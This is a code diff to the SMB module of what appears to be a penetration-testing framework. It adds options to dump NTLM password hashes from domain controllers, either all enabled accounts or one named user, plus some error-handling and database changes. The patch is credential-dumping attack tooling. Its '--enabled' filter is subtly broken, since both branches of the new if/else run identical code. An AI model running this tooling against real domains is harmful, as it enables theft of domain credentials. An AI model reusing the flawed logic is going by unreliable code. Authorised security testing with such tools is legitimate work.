@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
 import socket
@@ -160,6 +161,10 @@ class smb(connection):
         cegroup.add_argument("--ntds", choices={'vss', 'drsuapi'}, nargs='?', const='drsuapi', help="dump the NTDS.dit from target DCs using the specifed method\n(default: drsuapi)")
         #cgroup.add_argument("--ntds-history", action='store_true', help='Dump NTDS.dit password history')
         #cgroup.add_argument("--ntds-pwdLastSet", action='store_true', help='Shows the pwdLastSet attribute for each NTDS.dit account')
+
+        ngroup = smb_parser.add_argument_group("Credential Gathering", "Options for gathering credentials")
+        ngroup.add_argument("--enabled", action='store_true', help='Only dump enabled targets from DC')
+        ngroup.add_argument("--user", dest='userntds', type=str, help='Dump selected user from DC')
 
         egroup = smb_parser.add_argument_group("Mapping/Enumeration", "Options for Mapping/Enumerating")
         egroup.add_argument("--shares", action="store_true", help="enumerate shares and access")
@@ -498,7 +503,9 @@ class smb(connection):
         try:
             self.conn = SMBConnection(self.host, self.host, None, self.args.port, timeout=self.args.smb_timeout)
             self.smbv1 = False
-        except socket.error:
+        except socket.error as e:
+            if str(e).find('Too many open files') != -1:
+                self.logger.error('SMBv3 connection error on {}: {}'.format(self.host, e))
             return False
         except (Exception, NetBIOSTimeout) as e:
             logging.debug('Error creating SMBv3 connection to {}: {}'.format(self.host, e))
@@ -623,7 +630,7 @@ class smb(connection):
 
     def shares(self):
         temp_dir = ntpath.normpath("\\" + gen_random_string())
-        computer_id = self.db.get_computers(filterTerm=self.host)[0][0]
+        #computer_id = self.db.get_computers(filterTerm=self.host)[0][0]
         try:
             user_id = self.db.get_user(
                 self.domain.split('.')[0].upper(),
@@ -659,7 +666,7 @@ class smb(connection):
 
                 if share_name != "IPC$":
                     try:
-                        self.db.add_share(computer_id, user_id, share_name, share_remark, read, write)
+                        self.db.add_share(self.hostname, user_id, share_name, share_remark, read, write)
                     except:
                         pass
 
@@ -1121,7 +1128,12 @@ class smb(connection):
 
         def add_ntds_hash(ntds_hash, host_id):
             add_ntds_hash.ntds_hashes += 1
-            self.logger.highlight(ntds_hash)
+            if "Enabled" in ntds_hash and self.args.enabled:
+                ntds_hash = ntds_hash.split(" ")[0]
+                self.logger.highlight(ntds_hash)
+            else:
+                ntds_hash = ntds_hash.split(" ")[0]
+                self.logger.highlight(ntds_hash)
             if ntds_hash.find('$') == -1:
                 if ntds_hash.find('\\') != -1:
                     domain, hash = ntds_hash.split('\\')
@@ -1162,13 +1174,13 @@ class smb(connection):
         NTDS = NTDSHashes(NTDSFileName, self.bootkey, isRemote=True, history=False, noLMHash=True,
                         remoteOps=self.remote_ops, useVSSMethod=use_vss_method, justNTLM=True,
                         pwdLastSet=False, resumeSession=None, outputFileName=self.output_filename,
-                        justUser=None, printUserStatus=False,
+                        justUser=self.args.userntds if self.args.userntds else None, printUserStatus=True,
                         perSecretCallback = lambda secretType, secret : add_ntds_hash(secret, host_id))
 
         try:
             self.logger.success('Dumping the NTDS, this could take a while so go grab a redbull...')
             NTDS.dump()
-            self.logger.success('Dumped {} NTDS hashes to {} of which {} were added to the database'.format(highlight(add_ntds_hash.ntds_hashes), self.output_filename + '.ntds',                                                                                                            highlight(add_ntds_hash.added_to_db)))
+            self.logger.success('Dumped {} NTDS hashes to {} of which {} were added to the database'.format(highlight(add_ntds_hash.ntds_hashes), self.output_filename + '.ntds', highlight(add_ntds_hash.added_to_db)))
         except Exception as e:
             #if str(e).find('ERROR_DS_DRA_BAD_DN') >= 0:
                 # We don't store the resume file if this error happened, since this error is related to lack
